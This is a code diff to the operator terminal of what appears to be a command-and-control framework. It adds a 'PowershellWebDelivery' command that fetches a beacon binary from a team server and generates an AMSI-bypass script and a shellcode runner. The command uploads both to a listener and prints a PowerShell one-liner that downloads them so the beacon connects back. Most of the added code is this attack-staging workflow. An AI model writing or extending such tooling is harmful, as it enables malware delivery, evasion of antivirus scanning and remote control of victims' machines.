@@ -1,12 +1,19 @@
 import sys
 import os
 import time
+import random
+import string 
 from threading import Thread, Lock
 from PyQt5.QtWidgets import *
 from PyQt5.QtGui import *
 from PyQt5.QtCore import *
 
 from grpcClient import *
+
+
+import sys
+sys.path.insert(1, './PowershellWebDelivery/')
+import GeneratePowershellLauncher
 
 
 class Terminal(QWidget):
@@ -69,28 +76,143 @@ class Terminal(QWidget):
 
             self.commandEditor.setCmdHistory()
             instructions = commandLine.split()
-
-            #TODO integrat generation of shellcode and stuff 
+            # if len(instructions) < 1:
+            #     return;
 
             if instructions[0]=="help":
-                helpText = "TODO"
+                helpText = getHelpMsg()
                 line = '<p style=\"color:orange;white-space:pre\">[+] ' + "help" + '</p>'
                 self.editorOutput.appendHtml(line)
                 line = '\n' + helpText  + '\n';
                 self.editorOutput.insertPlainText(line)
 
+            elif instructions[0]=="PowershellWebDelivery":
+                if len(instructions) != 2 and len(instructions) != 3:
+                    line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                    self.editorOutput.appendHtml(line)
+                    PowershellWebDeliveryHelpMsg = """PowershellWebDelivery:
+Generate a powershell oneliner to download a AMSI bypass and a shellcode runner from a listener. The shellcode runner launch a beacon configured to connect back to the specified listener.
+exemple:
+- PowershellWebDelivery ListenerHash
+- PowershellWebDelivery downloadListenerHash connectListenerHash"""
+
+                    line = '\n' + PowershellWebDeliveryHelpMsg  + '\n';
+                    self.editorOutput.insertPlainText(line)
+                    return;
+
+                # should take 2 listeners: 
+                #   the http/https listener to download the payload from
+                #   one listner for the beacon to connect to
+                listenerDownload = instructions[1]
+                if  len(instructions) == 3:
+                    listenerBeacon = instructions[2]
+                else:
+                    listenerBeacon = listenerDownload
+
+                commandTeamServer = "infoListener "+listenerDownload
+                termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+                resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+                result = resultTermCommand.result
+                if "Error" in result:
+                    self.editorOutput.insertPlainText(result)
+                    return        
+
+                results = result.split("\n")
+                if len(results)<4:
+                    return
+
+                schemeDownload = results[0]
+                ipDownload = results[1]
+                portDownload = results[2]
+                downloadPath = results[3]
+                if not downloadPath:
+                    return
+
+                if downloadPath[0]=="/":
+                    downloadPath = downloadPath[1:]
+
+                if  len(instructions) == 3:
+                    commandTeamServer = "infoListener "+listenerBeacon
+                    termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+                    resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    
+
+                    result = resultTermCommand.result
+                    if "Error" in result:
+                        self.editorOutput.insertPlainText(result)
+                        return   
+
+                    results = result.split("\n")
+                    if len(results)<4:
+                        return
+
+                    scheme = results[0]
+                    ip = results[1]
+                    port = results[2]
+                else:
+                    scheme=schemeDownload
+                    ip=ipDownload
+                    port=portDownload
+
+                commandTeamServer = "getBeaconBinary "+listenerBeacon
+                termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+                resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+                result = resultTermCommand.result
+                if "Error" in result:
+                    self.editorOutput.insertPlainText(result)
+                    return   
+
+                print("Beacon size", len(resultTermCommand.data))
+                beaconFilePath = "./BeaconHttp.exe"
+                beaconFile = open(beaconFilePath, "wb")
+                beaconFile.write(resultTermCommand.data)
+  
+                beaconArg = ip+" "+port
+                if scheme=="http" or scheme=="https":
+                    beaconArg = beaconArg+" "+scheme
+
+                # Generate the 2 files
+                payloadAmsi, payloadShellcodeRunner = GeneratePowershellLauncher.generatePayloads(beaconFilePath, beaconArg, "")
+
+                # Upload the 2 files and get the path
+                filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+                pathAmsiBypass = downloadPath
+                pathAmsiBypass = pathAmsiBypass + filename
+                commandTeamServer = "putIntoUploadDir "+listenerDownload+" "+filename
+                termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadAmsi.encode("utf-8"))
+                resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+                result = resultTermCommand.result
+                if "Error" in result:
+                    self.editorOutput.insertPlainText(result)
+                    return  
+
+                filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+                pathShellcodeRunner = downloadPath
+                pathShellcodeRunner = pathShellcodeRunner + filename
+                commandTeamServer = "putIntoUploadDir "+listenerDownload+" "+filename
+                termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadShellcodeRunner.encode("utf-8"))
+                resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+                result = resultTermCommand.result
+                if "Error" in result:
+                    self.editorOutput.insertPlainText(result)
+                    return  
+
+                # upload the 2 file to the server, get the url to reach them
+                # generate the oneliner
+                oneLiner = GeneratePowershellLauncher.generateOneLiner(ipDownload, portDownload, scheme, pathAmsiBypass, pathShellcodeRunner)
+
+                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                self.editorOutput.appendHtml(line)
+                line = '\n' + oneLiner  + '\n';
+                self.editorOutput.insertPlainText(line)
+            
             else:
-                
                 line = '<p style=\"color:orange;white-space:pre\">[+] send: \"' + commandLine + '\"</p>'
                 self.editorOutput.appendHtml(line)
-                line = '\n';
-                self.editorOutput.insertPlainText(line)
-
-                termCommand = TeamServerApi_pb2.TermCommand(cmd=commandLine)
-                resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
-                if resultTermCommand.result:
-                    line = resultTermCommand.result + '\n'
-
+                line = 'Command Unknown\n';
                 self.editorOutput.insertPlainText(line)
 
         self.setCursorEditorAtEnd()
@@ -162,10 +284,16 @@ class CommandEditor(QLineEdit):
         QTimer.singleShot(0, self.clear)
 
 
+def getHelpMsg():
+    helpText    = "help\n"
+    helpText += "PowershellWebDelivery\n"
+    return helpText
+
+
 completerData = [
     ('help',[]),
-    ('shellcode',[
-            ('127.0.0.1 8443 https',[]),
+    ('PowershellWebDelivery',[
+            ('listener',[]),
              ]),
 ]
 
